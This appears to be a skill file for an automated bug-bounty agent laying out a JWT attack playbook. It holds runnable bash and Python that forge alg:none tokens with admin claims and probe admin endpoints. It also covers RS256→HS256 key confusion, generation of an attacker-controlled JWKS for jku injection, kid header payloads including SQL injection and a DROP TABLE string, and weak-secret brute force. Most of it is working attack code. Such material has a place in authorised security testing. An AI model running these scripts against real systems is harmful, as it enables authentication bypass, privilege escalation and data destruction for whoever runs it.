---
name: k1nzr3c0n-hunt-jwt
description: "JWT cryptographic attack skill. Covers alg:none, RS256→HS256 key confusion, kid/jku injection, jwks_uri manipulation, JWT secret brute force, claim manipulation (user_id, role, exp). Always decode and inspect every JWT in the app."
tags: [jwt, authentication, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — JWT Cryptographic Attacks

> **Decode every JWT**: `echo JWT | cut -d. -f2 | base64 -d` — inspect all claims before testing.
> **alg:none**: signed tokens with empty signature — still works in many libraries.

---

## Crown Jewels

```
Priority 1 — alg:none: remove signature entirely → forge any claims
Priority 2 — RS256→HS256 key confusion: use RSA public key as HMAC secret
Priority 3 — jku/x5u injection: point to attacker-controlled JWKS
Priority 4 — kid header injection: SQLi or path traversal in key ID
Priority 5 — Weak secret brute force: hashcat cracking common secrets
```

---

## Phase 0 — JWT Inspection

```bash
TARGET="${TARGET:-}"
JWT_TOKEN="${JWT_TOKEN:-}"
HUNT="/tmp/hunt_jwt_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

if [ -z "$JWT_TOKEN" ]; then
  # Find JWTs in k1nzr3c0n outputs
  RUNS_BASE="/app/runs"
  JWT_TOKEN=$(grep -rhoP 'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}' \
    "$RUNS_BASE" 2>/dev/null | head -1)
fi

echo "=== JWT Decode ==="
echo "Header:"
echo "$JWT_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo ""
echo "Payload:"
echo "$JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

## Phase 1 — alg:none Attack

```bash
echo "=== alg:none Attack ==="
if [ -z "$JWT_TOKEN" ]; then echo "Set JWT_TOKEN first"; fi

# Decode payload and modify claims
PAYLOAD_JSON=$(echo "$JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null)
echo "Original payload: $PAYLOAD_JSON"

# Modify: change user ID, role, or admin flag
MODIFIED_PAYLOAD=$(echo "$PAYLOAD_JSON" | python3 -c "
import json, sys
p = json.load(sys.stdin)
# Try common privilege escalation claims
p['role'] = 'admin'
p['is_admin'] = True
p['user_id'] = 1
p['sub'] = '1'
print(json.dumps(p))
")

# Encode with alg:none header
HEADER_B64=$(echo '{"alg":"none","typ":"JWT"}' | python3 -c "
import base64, sys
data = sys.stdin.read().strip()
encoded = base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
print(encoded)
")

PAYLOAD_B64=$(echo "$MODIFIED_PAYLOAD" | python3 -c "
import base64, sys
data = sys.stdin.read().strip()
encoded = base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
print(encoded)
")

ALG_NONE_TOKEN="${HEADER_B64}.${PAYLOAD_B64}."

echo "alg:none token: ${ALG_NONE_TOKEN:0:80}..."
echo ""
echo "Testing:"
for ENDPOINT in /api/user/me /api/admin /api/admin/users /dashboard; do
  RESP=$(curl -sk "https://${TARGET}${ENDPOINT}" \
    -H "Authorization: Bearer ${ALG_NONE_TOKEN}")
  [ "${#RESP}" -gt 50 ] && echo "  [HIT] $ENDPOINT: ${RESP:0:80}"
done
```

## Phase 2 — RS256 → HS256 Key Confusion

```bash
echo "=== RS256 → HS256 Key Confusion ==="
echo "Steps:"
echo "  1. Get server's public key from: https://${TARGET}/.well-known/jwks.json"
echo "  2. Convert RSA public key to PEM"
echo "  3. Sign JWT with HS256 using the public key as HMAC secret"
echo "  4. Server validates with HMAC(HS256, public_key) — same as attacker's signature"
echo ""

# Get JWKS
curl -sk "https://${TARGET}/.well-known/jwks.json" | python3 -m json.tool 2>/dev/null

echo ""
echo "Tool: jwt_tool"
echo "  jwt_tool TOKEN -X k -pk public_key.pem"
echo ""
echo "Manual python approach:"
cat << 'PYEOF'
import jwt, requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Fetch public key
jwks = requests.get("https://TARGET/.well-known/jwks.json").json()
# Extract first key
n = jwks['keys'][0]['n']; e = jwks['keys'][0]['e']
# ... convert to PEM, sign with HS256
PYEOF
```

## Phase 3 — jku / x5u Header Injection

```bash
echo "=== jku Header Injection ==="
echo "Steps:"
echo "  1. Generate RSA key pair"
echo "  2. Host JWKS at attacker-controlled URL (or OOB)"
echo "  3. Add jku header pointing to attacker JWKS"
echo "  4. Sign JWT with attacker private key"
echo "  5. Server fetches attacker JWKS → validates attacker's signature"
echo ""
echo "Generate attacker JWKS:"
python3 << 'PYEOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import base64, json

# Generate RSA key
key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
pub = key.public_key()
pub_numbers = pub.public_key().public_numbers() if hasattr(pub, 'public_key') else pub.public_numbers()

def int_to_base64(n):
    hex_n = hex(n)[2:]
    if len(hex_n) % 2: hex_n = '0' + hex_n
    return base64.urlsafe_b64encode(bytes.fromhex(hex_n)).rstrip(b'=').decode()

print(json.dumps({
    "keys": [{
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": "attacker-key",
        "n": int_to_base64(pub_numbers.n),
        "e": int_to_base64(pub_numbers.e)
    }]
}, indent=2))
PYEOF
```

## Phase 4 — kid Header Injection

```bash
echo "=== kid (Key ID) Header Injection ==="
# kid often used in DB/filesystem lookup — inject SQLi or path traversal

# SQLi via kid
for KID_PAYLOAD in \
  "' UNION SELECT 'supersecret'--" \
  "../../dev/null" \
  "/dev/null" \
  "0" \
  "'; DROP TABLE keys;--"; do
  
  # Craft JWT with injected kid
  INJECTED_HEADER=$(echo "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"${KID_PAYLOAD}\"}" | \
    python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.stdin.read().encode()).rstrip(b'=').decode())")
  PAYLOAD_B64=$(echo "$JWT_TOKEN" | cut -d. -f2 2>/dev/null)
  
  echo "  kid: ${KID_PAYLOAD:0:40}"
done

echo ""
echo "jwt_tool for kid SQLi: jwt_tool TOKEN -I -hc kid -hv \"' UNION SELECT 'secret'--\" -S hs256 -p 'secret'"
```

## Phase 5 — Secret Brute Force

```bash
echo "=== JWT Secret Brute Force ==="
echo "Use hashcat for RS256/HS256 cracking:"
echo ""
echo "  # Extract JWT to file"
echo "  echo '${JWT_TOKEN}' > $HUNT/jwt.txt"
echo ""
echo "  # hashcat mode 16500 = JWT HS256"
echo "  hashcat -a 0 -m 16500 $HUNT/jwt.txt /usr/share/wordlists/rockyou.txt"
echo ""
echo "Common weak secrets to try manually:"
for SECRET in "secret" "password" "123456" "secret123" "your-256-bit-secret" \
              "change-this" "jwt-secret" "supersecret" "app_secret" "${TARGET}"; do
  python3 -c "
import hmac, hashlib, base64, sys
token = '${JWT_TOKEN}'
secret = '${SECRET}'
if not token: sys.exit()
parts = token.split('.')
sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f'{parts[0]}.{parts[1]}'.encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
if sig == parts[2]:
    print(f'[CRACKED] Secret: {secret}')
" 2>/dev/null
done
```

## Gate 0

```bash
echo "=== JWT Gate 0 ==="
echo "  □ alg:none: token with empty signature ACCEPTED on protected endpoint"
echo "  □ Key confusion: forged HS256 token accepted as valid RS256"
echo "  □ jku: server fetched attacker's JWKS URL (OOB callback)"
echo "  □ Secret cracked: hashcat found secret, signed token accepted"
echo "  □ Claims changed: role=admin or user_id=1 accepted"
echo "  □ Impact: access to admin panel / other user's data"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
JWT alg:none accepted on [/api/admin] allowing authentication bypass by forging arbitrary claims
JWT RS256→HS256 key confusion allows forging valid tokens using server's public key as HMAC secret
JWT secret brute-forced: weak secret ['secret'] allows token forgery and admin privilege escalation
```
